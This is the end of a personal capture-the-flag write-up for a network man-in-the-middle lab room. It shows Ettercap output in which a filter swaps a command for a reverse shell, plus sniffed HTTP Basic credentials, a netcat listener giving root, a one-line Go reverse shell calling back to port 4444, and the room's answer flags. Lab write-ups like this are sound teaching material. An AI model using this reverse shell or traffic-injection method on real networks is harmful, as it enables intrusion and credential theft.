Mon Feb  6 17:47:39 2023 [989756]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (14)
cat server.sh


Mon Feb  6 17:47:39 2023 [991293]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (198)
#!/bin/bash
cd /root/www
python SimpleHTTPAuthServer.py 80 admin:s3cr3t_P4zz &
cd /root
while :
do
	go run /root/rev.go &
	sleep 13
	pkill -9 -f "go run /root/rev.go"
	pkill -9 -f "/bin/bash$"
done


Mon Feb  6 17:47:39 2023 [991309]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)


Mon Feb  6 17:47:40 2023 [114654]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:40 2023 [117009]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:41 2023 [29462]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
pwd


Mon Feb  6 17:47:41 2023 [36943]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:41 2023 [406896]
TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:41 2023 [412990]
TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:42 2023 [408107]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
pwd


Mon Feb  6 17:47:42 2023 [412965]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:42 2023 [828799]
TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:42 2023 [837104]
TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:43 2023 [8789]
TCP  192.168.12.10:48236 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:47:43 2023 [13007]
TCP  192.168.12.20:80 --> 192.168.12.10:48236 | SA (0)


Mon Feb  6 17:47:43 2023 [21023]
TCP  192.168.12.10:48236 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:47:43 2023 [21244]
TCP  192.168.12.10:48236 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:47:43 2023 [29108]
TCP  192.168.12.20:80 --> 192.168.12.10:48236 | A (0)


Mon Feb  6 17:47:43 2023 [30674]
TCP  192.168.12.20:80 --> 192.168.12.10:48236 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:47:43 2023 [30904]
TCP  192.168.12.20:80 --> 192.168.12.10:48236 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:47:43 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:47:43 2023 [37276]
TCP  192.168.12.10:48236 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:47:43 2023 [38222]
TCP  192.168.12.10:48236 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:47:43 2023 [45162]
TCP  192.168.12.20:80 --> 192.168.12.10:48236 | A (0)


Mon Feb  6 17:47:43 2023 [151341]
TCP  192.168.12.20:44752 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:47:43 2023 [157059]
TCP  192.168.12.10:4444 --> 192.168.12.20:44752 | SA (0)


Mon Feb  6 17:47:43 2023 [164996]
TCP  192.168.12.20:44752 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:43 2023 [175375]
TCP  192.168.12.10:4444 --> 192.168.12.20:44752 | AP (7)
whoami


Mon Feb  6 17:47:43 2023 [181085]
TCP  192.168.12.20:44752 --> 192.168.12.10:4444 | A (0)
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######

Closing text interface...


Terminating ettercap...
Lua cleanup complete!
ARP poisoner deactivated.
RE-ARPing the victims...


Mon Feb  6 17:47:43 2023 [739880]
TCP  192.168.12.20:34806 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:44 2023 [760821]
TCP  192.168.12.20:34806 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:46 2023 [8828]
TCP  192.168.12.20:34794 --> 192.168.12.66:6666 | S (0)
Unified sniffing was stopped.


admin@eve:~$ Listening on 0.0.0.0 6666
Connection received on 192.168.12.20 34764
fg
nc -nvlp 6666
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
ls
rev.go
root.txt
server.sh
www
cat root.txt
THM{wh4t_an_ev1l_M!tM_u_R}
cat rev.go
package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.12.10:4444");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}
cat erver.sh
cat: erver.sh: No such file or directory
cat server.sh
#!/bin/bash
cd /root/www
python SimpleHTTPAuthServer.py 80 admin:s3cr3t_P4zz &
cd /root
while :
do
	go run /root/rev.go &
	sleep 13
	pkill -9 -f "go run /root/rev.go"
	pkill -9 -f "/bin/bash$"
done

cd www
l
/bin/sh: 10: l: not found
ls
SimpleHTTPAuthServer.py
test.txt
user.txt
cat test.txt
OK
cat user.txt
THM{wh0s_$n!ff1ng_0ur_cr3ds}
ls -lah
total 20K
drwxr-xr-x 2 root root 4.0K Apr 19  2022 .
drwx------ 4 root root 4.0K Apr  4  2022 ..
-rw-r--r-- 1 root root 1.6K Mar 27  2022 SimpleHTTPAuthServer.py
-rw-r--r-- 1 root root    3 Mar 27  2022 test.txt
-rw-r--r-- 1 root root   29 Apr 19  2022 user.txt
cat SimpleHTTPAuthServer.py
import BaseHTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
import sys
import base64

key = ""

class AuthHandler(SimpleHTTPRequestHandler):
    ''' Main class to present webpages and authentication. '''
    def do_HEAD(self):
        print "send header"
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_AUTHHEAD(self):
        print "send header"
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm=\"Test\"')
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        global key
        ''' Present frontpage with user authentication. '''
        if self.headers.getheader('Authorization') == None:
            self.do_AUTHHEAD()
            self.wfile.write('no auth header received')
            pass
        elif self.headers.getheader('Authorization') == 'Basic '+key:
            SimpleHTTPRequestHandler.do_GET(self)
            pass
        else:
            self.do_AUTHHEAD()
            self.wfile.write(self.headers.getheader('Authorization'))
            self.wfile.write('not authenticated')
            pass

def test(HandlerClass = AuthHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    BaseHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    if len(sys.argv)<3:
        print "usage SimpleAuthServer.py [port] [username:password]"
        sys.exit()
    key = base64.b64encode(sys.argv[2])
    test()

https://gns3.com/software/video

:) nice
```


What is the root.txt flag?

*THM{wh4t_an_ev1l_M!tM_u_R}*

### Conclusion

I hope this room offered a new perspective for network pentesting and gave you a new _layer_ of attacks for your toolbelt, and hopefully, you've had some fun along the way, too!

It was also meant as an inspiration for the community to create more L2 content and learning resources, so feel free to take a look at Eve's L2 virtualization "backend" ([GNS3](https://gns3.com/software/video)):  
[http://10.10.148.6:3080](http://10.10.148.6:3080/static/web-ui/server/2/project/cd41dfbe-4158-4ae0-b199-14cd19a36df8)  

Please, don't hesitate to provide [me](https://linkedin.com/in/tobjasr/) any feedback or questions on implementing GNS3 boxes, and stay tuned for some more L2 action!

Answer the questions below

Read the above.

![[Pasted image 20230206125337.png]]
![[Pasted image 20230206125508.png]]


[[Brute Force Heroes]]